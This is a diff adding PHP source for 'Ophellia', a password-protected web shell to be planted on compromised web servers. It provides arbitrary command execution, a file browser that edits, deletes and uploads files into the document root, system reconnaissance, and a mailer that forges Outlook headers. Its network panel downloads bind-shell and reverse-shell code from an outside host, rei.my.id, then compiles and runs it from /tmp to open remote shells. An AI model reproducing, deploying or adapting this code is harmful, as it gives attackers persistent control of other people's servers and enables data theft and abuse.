+        $this->currentPath = hexToString($this->get['d'] ?? stringToHex(getcwd()));
+        $this->selfFile = $_SERVER['PHP_SELF'];
+        chdir($this->currentPath);
+    }
+
+    public function run(): void
+    {
+        if (!$this->isAuthenticated()) {
+            $this->showLoginForm();
+            return;
+        }
+
+        $this->showHeader();
+
+        if (isset($this->get['t'])) {
+            $tool = hexToString($this->get['t']);
+            switch ($tool) {
+                case 'network':
+                    $this->showNetworkTools();
+                    break;
+                case 'mailer':
+                    $this->showMailerTools();
+                    break;
+                case 'upload':
+                    $this->showUploadTools();
+                    break;
+                case 'info':
+                    $this->showSystemInfo();
+                    break;
+                case 'mkfile':
+                    $this->showFileCreationTools();
+                    break;
+                case 'mkdir':
+                    $this->showDirectoryCreationTools();
+                    break;
+                case 'command':
+                    $this->showCommandExecutionTools();
+                    break;
+                case 'cname':
+                    $this->showRenameFileTools();
+                    break;
+                case 'fedit':
+                    $this->showFileEditTools();
+                    break;
+                case 'fview':
+                    $this->showFileViewTools();
+                    break;
+                case 'download':
+                    $this->downloadFile(hexToString($this->get['f']));
+                    break;
+                default:
+                    $this->showFileManager();
+                    break;
+            }
+        } else {
+            $this->showFileManager();
+        }
+
+        $this->handleFileOperations();
+        $this->showFooter();
+    }
+
+    private function isAuthenticated(): bool
+    {
+        if (isset($this->post['pass'])) {
+            if (verifyPassword($this->post['pass'])) {
+                $_SESSION['authenticated'] = true;
+            }
+        }
+
+        return $_SESSION['authenticated'] ?? false;
+    }
+
+    private function showLoginForm(): void
+    {
+        echo '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <meta name="robots" content="noindex, nofollow" />
+            <title>WELCOME!</title>
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
+            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+        </head>
+        <body>
+            <div class="login-container">
+                <h1>WELCOME BACK!</h1>
+                <form action="" method="post">
+                    <input type="password" name="pass" placeholder="Password" required>
+                    <button type="submit">Login</button>
+                </form>
+            </div>
+        </body>
+        </html>';
+    }
+
+    private function showHeader(): void
+    {
+        echo '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>OPHELLIA v' . VERSION . '</title>
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+        </head>
+        <body>
+            <header>
+                <h1 class="title">ELLIOTTOPHELLIA</h1>
+                <p class="uname">' . php_uname('a') . '</p>
+            </header>
+
+        <nav class="mobile-nav">
+            <button class="hamburger" aria-label="Menu">☰ MENU</button>
+            <ul class="nav-menu">
+              <li><a href="' . $this->selfFile . '"><i class="fas fa-home"></i> Home</a></li>
+              <li><a href="' . $this->selfFile . '?t=' . stringToHex('upload') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-upload"></i> Upload</a></li>
+              <li><a href="' . $this->selfFile . '?t=' . stringToHex('network') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-network-wired"></i> Network</a></li>
+              <li><a href="' . $this->selfFile . '?t=' . stringToHex('mailer') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-envelope"></i> Mailer</a></li>
+              <li><a href="' . $this->selfFile . '?t=' . stringToHex('info') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-info-circle"></i> Info</a></li>
+              <li><a href="' . $this->selfFile . '?exit"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+          </ul>
+        </nav>
+
+            <main>';
+    }
+
+    private function handleFileOperations(): void
+    {
+        if (isset($this->get['rfile']) && is_writable(hexToString($this->get['rfile']))) {
+            $this->removeFile(hexToString($this->get['rfile']));
+        }
+
+        if (isset($this->get['rmdir']) && is_writable(hexToString($this->get['rmdir']))) {
+            $this->removeDirectory(hexToString($this->get['rmdir']));
+        }
+
+        if (isset($this->get['exit'])) {
+            $this->exit();
+        }
+    }
+
+    private function removeFile(string $file): void
+    {
+        if (unlink($file)) {
+            echo "<dialog id='successModal' class='modal success'>
+            <p>File $file Deleted Successfully!</p>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+            <p>Failed to delete file $file.</p>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function removeDirectory(string $dir): void
+    {
+        if (rmdir($dir)) {
+            echo "<dialog id='successModal' class='modal success'>
+            <p>Directory $dir Deleted Successfully!</p>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+            <p>Failed to delete directory.</p>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function createFile(string $fileName, string $fileContent = ''): void
+    {
+        $fullPath = $this->currentPath . '/' . $fileName;
+
+        if (file_put_contents($fullPath, $fileContent) !== false) {
+            echo "<dialog id='successModal' class='modal success'>
+                <p>File '$fileName' Created Successfully!</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+                <p>Failed to create file '$fileName'.</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?t=" . stringToHex('mkfile') . "&d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function createDirectory(string $dir): void
+    {
+        if (mkdir($this->currentPath . "/" . $dir, 0777, true)) {
+            echo "<dialog id='successModal' class='modal success'>
+                <p>Directory $dir Created Successfully!</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+                <p>Failed to create directory $dir.</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function exit(): void
+    {
+        session_destroy();
+        echo '<script>window.location.href = "' . $this->selfFile . '";</script>';
+    }
+
+    private function downloadFile(string $file): void
+    {
+        if (file_exists($file)) {
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($file));
+            readfile($file);
+            exit;
+        }
+    }
+
+    private function executeNetworkTool(string $type, string $ip, string $port, string $pty, string $rby, string $bcc, string $bcp, string $bpc, string $bpp): void
+    {
+        switch ($type) {
+            case 'cb':
+                safeFileWrite('/tmp/cb.c', $bpc);
+                getFunctionalCmd('gcc -o /tmp/cb /tmp/cb.c');
+                getFunctionalCmd('/tmp/cb ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep cb') . "</pre>";
+                break;
+            case 'pb':
+                safeFileWrite('/tmp/pb.pl', $bpp);
+                getFunctionalCmd('perl /tmp/pb.pl ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pb') . "</pre>";
+                break;
+            case 'cbc':
+                safeFileWrite('/tmp/cbc.c', $bcc);
+                getFunctionalCmd('gcc -o /tmp/cbc /tmp/cbc.c');
+                getFunctionalCmd('/tmp/cbc ' . $ip . ' ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep cbc') . "</pre>";
+                break;
+            case 'pbc':
+                safeFileWrite('/tmp/pbc.pl', $bcp);
+                getFunctionalCmd('perl /tmp/pbc.pl ' . $ip . ' ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pbc') . "</pre>";
+                break;
+            case 'rbb':
+                safeFileWrite('/tmp/rbb.rb', $rby);
+                getFunctionalCmd('ruby /tmp/rbb.rb ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep rbb') . "</pre>";
+                break;
+            case 'rbbc':
+                safeFileWrite('/tmp/rbbc.rb', $rby);
+                getFunctionalCmd('ruby /tmp/rbbc.rb ' . $port . ' ' . $ip . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep rbbc') . "</pre>";
+                break;
+            case 'pyb':
+                safeFileWrite('/tmp/pyb.py', $pty);
+                getFunctionalCmd('python /tmp/pyb.py ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pyb') . "</pre>";
+                break;
+            case 'pybc':
+                safeFileWrite('/tmp/pybc.py', $pty);
+                getFunctionalCmd('python /tmp/pybc.py ' . $port . ' ' . $ip . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pybc') . "</pre>";
+                break;
+        }
+    }
+
+    private function checkMailServerAccess(): bool
+    {
+        $testTo = 'test@example.com';
+        $testSubject = 'Test Mail Server Access';
+        $testMessage = 'This is a test message to check mail server access.';
+        $testHeaders = 'From: test@' . $_SERVER['SERVER_NAME'] . "\r\n" . 'X-Mailer: PHP/' . phpversion();
+
+        // Suppress warnings and notices during the mail() function call
+        $errorReporting = error_reporting();
+        error_reporting(E_ERROR);
+
+        $result = @mail($testTo, $testSubject, $testMessage, $testHeaders);
+
+        // Restore original error reporting level
+        error_reporting($errorReporting);
+
+        return $result;
+    }
+
+    private function sendSimpleMail(): void
+    {
+        $to = $this->extractEmail($this->post['to']);
+        $subject = $this->post['subject'];
+        $message = $this->post['message'];
+        $from = $this->extractEmail($this->post['from']);
+        $fromName = $this->extractName($this->post['from']);
+
+        $headers = "From: $fromName <$from>\r\n";
+        $headers .= "Reply-To: $from\r\n";
+        $headers .= "X-Priority: 1\r\n";
+        $headers .= "X-MSmail-Priority: High\r\n";
+        $headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n";
+        $headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n";
+
+        if (mail($to, $subject, $message, $headers)) {
+            echo "<dialog id='successModal' class='modal success'>
+                    <p>Mail Sent Successfully!</p>
+                    <button onclick='this.closest('dialog').close()'>Close</button>
+                  </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+                    <p>Failed to send mail.</p>
+                    <button onclick='this.closest('dialog').close()'>Close</button>
+                  </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function extractEmail(string $input): string
+    {
+        if (strpos($input, '<') !== false && strpos($input, '>') !== false) {
+            preg_match('/<(.+?)>/', $input, $matches);
+            return $matches[1] ?? $input;
+        }
+        return trim($input);
+    }
+
+    private function extractName(string $input): string
+    {
+        preg_match('/(.+?)\s*</', $input, $matches);
+        return trim($matches[1] ?? '');
+    }
+
+    private function handleFileUpload(): void
+    {
+        $uploadPath = $this->post['uploadtype'] == 1 ? $this->currentPath : $_SERVER['DOCUMENT_ROOT'];
+        $tmp = $this->files['upload']['tmp_name'];
+        $up = basename($this->files['upload']['name']);
+        if (move_uploaded_file($tmp, $uploadPath . "/" . $up)) {
+            echo "<dialog id='successModal' class='modal success'>
+            <p>File Uploaded successfully!</p>
+            <button onclick='this.closest('dialog').close()'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+            <p>Failed to upload file.</p>
+            <button onclick='this.closest('dialog').close()'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function showPathNavigation(): void
+    {
+        echo '<p class="file-manager-utils">';
+        $ps = preg_split("/(\\\|\/)/", $this->currentPath);
+        foreach ($ps as $k => $v) {
+            if ($k == 0 && $v == "") {
+                echo "<a href='?d=2f'>~</a>/";
+                continue;
+            }
+            if ($v == "") {
+                continue;
+            }
+
+            echo "<a href='?d=";
+            for ($i = 0; $i <= $k; $i++) {
+                echo stringToHex($ps[$i]);
+                if ($i != $k) {
+                    echo "2f";
+                }
+
+            }
+            echo "'>{$v}</a>/";
+        }
+        echo '</p>';
+    }
+
+    private function showFileCreator(): void
+    {
+        echo '<p class="file-manager-utils">
+        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkfile') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-file-alt"></i> New File</a> ]
+        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkdir') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-folder-plus"></i> New Folder</a> ]
+        [ <a href="' . $this->selfFile . '?t=' . stringToHex('command') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-terminal"></i> Command</a> ]
+        </p>';
+    }
+
+    private function showFileManager(): void
+    {
+        echo '<section class="tool-section">
+        <h2>File Manager</h2>';
+
+        $this->showPathNavigation();
+        $this->showFileCreator();
+
+        echo '<table class="table-container">
+        <thead>
+            <tr>
+                <th>File Name</th>
+                <th>Actions</th>
+                <th>Size</th>
+                <th>Type</th>
+                <th>Permissions</th>
+                <th>Owner/Group</th>
+                <th>Last Modified</th>
+            </tr>
+        </thead>
+        <tbody>';
+
+        $files = scandir($this->currentPath);
+        $folders = [];
+        $regularFiles = [];
+
+        foreach ($files as $file) {
+            if (is_dir($this->currentPath . '/' . $file)) {
+                $folders[] = $file;
+            } else {
+                $regularFiles[] = $file;
+            }
+        }
+
+        // Display folders first
+        foreach ($folders as $folder) {
+            $fullPath = $this->currentPath . '/' . $folder;
+
+            if ($folder == "." || $folder == "..") {
+                $link = $folder == ".." ? stringToHex(dirname($this->currentPath)) : stringToHex($this->currentPath);
+                echo "<tr>
+                <td><img src='//rei.my.id/fldr.png' /> <b><a href='?d={$link}'>$folder</a></b></td>
+                <td colspan='6'></td>
+            </tr>";
+            } else {
+                $actions = "<i class='fa fa-fw fa-download nothing'></i> <i class='fa fa-fw fa-edit nothing'></i> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rmdir=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";
+                echo "<tr>
+                <td><img src='//rei.my.id/fldr.png' /> <b><a href='{$this->selfFile}?d=" . stringToHex($fullPath) . "'>$folder</a></b></td>
+                <td>$actions</td>
+                <td>-</td>
+                <td>" . getFileType($fullPath) . "</td>
+                <td>" . getFilePermissions($fullPath) . "</td>
+                <td>" . getOwnerGroup($fullPath) . "</td>
+                <td>" . getLastModified($fullPath) . "</td>
+            </tr>";
+            }
+        }
+
+        // Then display files
+        foreach ($regularFiles as $file) {
+            $fullPath = $this->currentPath . '/' . $file;
+            $actions = "<a href='" . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-download'></i></a> <a href='{$this->selfFile}?t=" . stringToHex('fedit') . "&fedit=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-edit'></i></a> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rfile=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";
+
+            echo "<tr>
+            <td><img src='//rei.my.id/file.png' /> <a href='{$this->selfFile}?t=" . stringToHex('fview') . "&f=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'>$file</a></td>
+            <td>$actions</td>
+            <td>" . formatFileSize(filesize($fullPath)) . "</td>
+            <td>" . getFileType($fullPath) . "</td>
+            <td>" . getFilePermissions($fullPath) . "</td>
+            <td>" . getOwnerGroup($fullPath) . "</td>
+            <td>" . getLastModified($fullPath) . "</td>
+        </tr>";
+        }
+
+        echo '</tbody></table></section>';
+    }
+
+    private function showFileViewTools(): void
+    {
+        $file = hexToString($this->get['f']);
+        $content = htmlspecialchars(file_get_contents($file));
+
+        echo '<section class="tool-section">
+            <h2>View File: ' . htmlspecialchars($file) . '</h2>
+            <form method="post" action="">
+                <div class="form-group">
+                    <textarea rows="25" readonly>' . $content . '</textarea>
+                </div>
+                <button type="button" onclick="editFile()">Edit</button>
+                <button type="button" onclick="downloadFile()">Download</button>
+                <button type="button" onclick="goBack()">Back</button>
+            </form>
+            <script>
+            function goBack() {
+                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
+            }
+            function editFile() {
+                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('fedit') . '&fedit=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
+            }
+            function downloadFile() {
+                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
+            }
+            </script>
+        </section>';
+    }
+
+    private function showFileEditTools(): void
+    {
+        $file = hexToString($this->get['fedit']);
+        $content = htmlspecialchars(file_get_contents($file));
+
+        echo '<section class="tool-section">
+            <h2>Edit File: ' . htmlspecialchars($file) . '</h2>
+            <form method="post" action="">
+                <div class="form-group">
+                    <textarea name="content" rows="25">' . $content . '</textarea>
+                </div>
+                <button type="submit" name="save_edit">Save Changes</button>
+                <button type="button" onclick="cancelForm()">Cancel</button>
+            </form>
+            <script>
+            function cancelForm() {
+                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
+            }
+            </script>
+        </section>';
+
+        if (isset($this->post['save_edit'])) {
+            if (file_put_contents($file, $this->post['content']) !== false) {
+                echo "<dialog id='successModal' class='modal success'>
+                    <p>File Edited Successfully!</p>
+                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+                  </dialog>";
+                echo "<script>document.getElementById('successModal').showModal();</script>";
+            } else {
+                echo "<dialog id='errorModal' class='modal error'>
+                    <p>Failed to edit file.</p>
+                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+                  </dialog>";
+                echo "<script>document.getElementById('errorModal').showModal();</script>";
+            }
+        }
+    }
+
+    private function showRenameFileTools(): void
+    {
+        echo '<section class="tool-section">
+            <h2>Rename File: ' . hexToString($this->get['oldname']) . '</h2>
+            <form method="post" action="">
+            <input type="text" name="oldname" value="' . hexToString($this->get['oldname']) . '" style="display: none;" readonly>
+            <input type="text" name="newname" placeholder="New File Name" required>
+            <button type="submit">Rename File</button>
+            <button type="button" onclick="cancelForm()">Cancel</button>
+        </form>
+        <script>
+        function cancelForm() {
+            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
+        }
+        </script></section>';
+        if ($this->post['oldname'] && $this->post['newname']) {
+            if (isset($this->post['oldname'])) {
+                rename($this->post['oldname'], $this->post['newname']);
+                echo "<dialog id='successModal' class='modal success'>
+                <p>File Renamed Successfully!</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+                echo "<script>document.getElementById('successModal').showModal();</script>";
+
+            } else {
+                echo "<dialog id='errorModal' class='modal error'>
+                <p>Failed to rename file.</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
+              </dialog>";
+                echo "<script>document.getElementById('errorModal').showModal();</script>";
+            }
+        }
+    }
+
+    private function showFileCreationTools(): void
+    {
+        echo "<section class='tool-section'>
+            <h2>Create File</h2>
+            <form method='post' action=''>
+                <div class='form-group'>
+                    <input type='text' id='fname' name='fname' placeholder='File Name' required>
+                </div>
+                <div class='form-group'>
+                    <textarea id='ftext' name='ftext' rows='15' placeholder='File Content'></textarea>
+                </div>
+                <button type='submit' name='createfile'>Create File</button>
+            <button type='button' onclick='cancelForm()'>Cancel</button>
+        </form>
+        <script>
+        function cancelForm() {
+            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
+        }
+        </script>
+        </section>";
+
+        if (isset($this->post['createfile'])) {
+            $this->createFile($this->post['fname'], $this->post['ftext'] ?? '');
+        }
+    }
+
+    private function showDirectoryCreationTools(): void
+    {
+        echo "<section class='tool-section'>
+        <h2>Create Directory</h2>
+        <form method='post' action='' id='dirForm'>
+            <div class='form-group'>
+                <input type='text' id='dirname' name='dirname' placeholder='Directory Name' required>
+            </div>
+            <button type='submit' name='createdir'>Create Directory</button>
+            <button type='button' onclick='cancelForm()'>Cancel</button>
+        </form>
+        <script>
+        function cancelForm() {
+            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
+        }
+        </script>
+        </section>";
+
+        if (isset($this->post['createdir'])) {
+            $this->createDirectory($this->post['dirname']);
+        }
+    }
+
+    private function showNetworkTools(): void
+    {
+        $pty = file_get_contents('https://rei.my.id/back_connect/python.txt');
+        $rby = file_get_contents('https://rei.my.id/back_connect/ruby.txt');
+        $bcc = file_get_contents('https://rei.my.id/back_connect/c.txt');
+        $bcp = file_get_contents('https://rei.my.id/back_connect/perl.txt');
+        $bpc = file_get_contents('https://rei.my.id/bind_shell/c.txt');
+        $bpp = file_get_contents('https://rei.my.id/bind_shell/perl.txt');
+
+        echo '
+        <section class="tool-section">
+            <h2>Network Tools</h2>
+            <h3>Bind Shell</h3>
+            <form method="post" action="">
+                <p> IP : </p>
+                <input type="text" name="ip" value="' . gethostbyname($_SERVER['HTTP_HOST']) . '" readonly>
+                <p> Port : </p>
+                <input type="text" name="port" value="31337">
+                <p> Type : </p>
+                <select name="type">
+                            <option value="cb">C</option>
+                            <option value="pb">Perl</option>
+                            <option value="rbb">Ruby</option>
+                            <option value="pyb">Python</option>
+                        </select>
+                <button type="submit">Execute</button>
+            </form>
+            <br/>
+            <h3>Reverse Shell</h3>
+            <form method="post" action="">
+                <p> IP : </p>
+                <input type="text" name="ip" value="">
+                <p> Port : </p>
+                <input type="text" name="port" value="31337">
+                <p> Type : </p>
+                <select name="type">
+                    <option value="cbc">C</option>
+                    <option value="pbc">Perl</option>
+                    <option value="rbbc">Ruby</option>
+                    <option value="pybc">Python</option>
+                    </select>
+                <button type="submit">Execute</button>
+            </form>
+        </section>';
+
+        if (isset($this->post['type'])) {
+            $this->executeNetworkTool($this->post['type'], $this->post['ip'], $this->post['port'], $pty, $rby, $bcc, $bcp, $bpc, $bpp);
+        }
+    }
+
+    private function showMailerTools(): void
+    {
+        $mailServerAccessible = $this->checkMailServerAccess();
+
+        echo '<section class="tool-section">
+            <h2>Mailer Tools</h2>';
+
+        if ($mailServerAccessible) {
+            echo '<form method="post" action="" class="mailer-form">
+                <div class="form-group">
+                    <label for="from">From:</label>
+                    <input type="text" id="from" name="from" value="Ophellia < ophellia@' . $_SERVER['SERVER_NAME'] . ' >">
+                </div>
+                <div class="form-group">
+                    <label for="to">To:</label>
+                    <input type="text" id="to" name="to" value="Ophellia < contact@rei.my.id >">
+                </div>
+                <div class="form-group">
+                    <label for="subject">Subject:</label>
+                    <input type="text" id="subject" name="subject" value="Fuck your mom!">
+                </div>
+                <div class="form-group">
+                    <label for="message">Message:</label>
+                    <textarea id="message" name="message" rows="15">my ip address is ' . $_SERVER['REMOTE_ADDR'] . '</textarea>
+                </div>
+                <div class="form-group">
+                    <button type="submit" name="send_mail">Send Mail</button>
+                </div>
+            </form>';
+
+            if (isset($this->post['send_mail'])) {
+                $this->sendSimpleMail();
+            }
+        } else {
+            echo '<p class="error-message">Mail server is not accessible. Mailer tools are currently disabled.</p>';
+        }
+
+        echo '</section>';
+    }
+
+    private function showUploadTools(): void
+    {
+        echo "<section class='tool-section'>
+            <h2>Upload Tools</h2>
+            <form method='post' enctype='multipart/form-data'>
+                <div class='upload-options'>
+                    <div class='upload-option'>
+                        <input type='radio' id='current-dir' name='uploadtype' value='1' checked>
+                        <p>[PATH]</p>
+                        <label for='current-dir'>{$this->currentPath}</label>
+                    </div>
+                    <div class='upload-option'>
+                        <input type='radio' id='doc-root' name='uploadtype' value='2'>
+                        <p>[ROOT]</p>
+                        <label for='doc-root'>{$_SERVER['DOCUMENT_ROOT']}</label>
+                    </div>
+                </div>
+                <div class='file-input-wrapper'>
+                    <input type='file' name='upload' onchange='this.form.querySelector('button[type=submit]').click()'>
+                </div>
+                <button type='submit' name='upload' style='display:none;'>Upload</button>
+            </form>
+        </section>";
+
+        if (isset($this->post['upload'])) {
+            $this->handleFileUpload();
+        }
+    }
+
+    private function showCommandExecutionTools(): void
+    {
+        echo '<section class="tool-section">
+            <h2>Execute Command</h2>
+            <form method="post" action="">
+                <div class="form-group">
+                    <input type="text" id="command" name="execute" placeholder="uname -a" required>
+                </div>
+                <button type="submit">Execute</button>
+                <button type="button" onclick="cancelForm()">Cancel</button>
+        </form>
+        <script>
+        function cancelForm() {
+            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
+        }
+        </script>';
+
+        if (isset($this->post['execute']) && !empty($this->post['execute'])) {
+            echo '<pre>' . getFunctionalCmd($this->post['execute']) . '</pre>';
+        }
+
+        echo '</section>';
+    }
+
+    private function showSystemInfo(): void
+    {
+        $disableFunctions = ini_get('disable_functions') ?: 'NONE';
+        $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
+        $freeSpace = function_exists('disk_free_space') ? formatFileSize(disk_free_space(".")) : 'N/A';
+
+        $infoItems = [
+            "System" => php_uname('a') . " " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'),
+            "User" => function_exists('get_current_user') ? get_current_user() : 'N/A',
+            "Free Space" => $freeSpace,
+            "Server IP" => gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost'),
+            "Client IP" => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
+            "Safe Mode" => $safeMode,
+            "PHP Version" => phpversion(),
+            "Disabled Functions" => $disableFunctions,
+        ];
+
+        echo "<section class='tool-section'>";
+        echo "<h2>System Information</h2>";
+        echo "<div class='info-table'>";
+        foreach ($infoItems as $key => $value) {
+            echo "<div class='info-row'>";
+            echo "<div class='info-key'>" . htmlspecialchars($key) . "</div>";
+            echo "<div class='info-value'>" . htmlspecialchars($value) . "</div>";
+            echo "</div>";
+        }
+        echo "</div>";
+        echo "</section>";
+    }
+
+    private function showFooter(): void
+    {
+        echo '</main>
+            <footer>
+                <p><a href="//rei.my.id">@elliottophellia</a><br/>Copyright &copy; 2022 - ' . date('Y') . ' <a href="//github.com/elliottophellia/ophellia">Ophellia</a>.<br/><a href="//github.com/elliottophellia/ophellia">Ophellia</a> are free and open source software distributed under the GNU General Public License.</p>
+            </footer>
+        <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const hamburger = document.querySelector(".hamburger");
+            const navMenu = document.querySelector(".nav-menu");
+
+            hamburger.addEventListener("click", function() {
+                navMenu.classList.toggle("show");
+            });
+
+            // Close the menu when clicking outside
+            document.addEventListener("click", function(event) {
+                if (!navMenu.contains(event.target) && !hamburger.contains(event.target)) {
+                    navMenu.classList.remove("show");
+                }
+            });
+        });
+        </script>
+        </body>
+        </html>';
+    }
+}
+
+session_start();
+error_reporting(0);
+ini_set('display_errors', '0');
+header('X-Powered-By: Ophellia v' . VERSION);
+
+try {
+    $app = new Elliottophellia($_GET, $_POST, $_FILES);
+    $app->run();
+} catch (Throwable $e) {
+    $errorMessage = 'Caught exception: ' . $e->getMessage() . "\n" . $e->getTraceAsString();
+    echo "<p>An error occurred. Please check the browser console for more details.</p><script>console.error(" . json_encode($errorMessage) . ");</script>";
+}
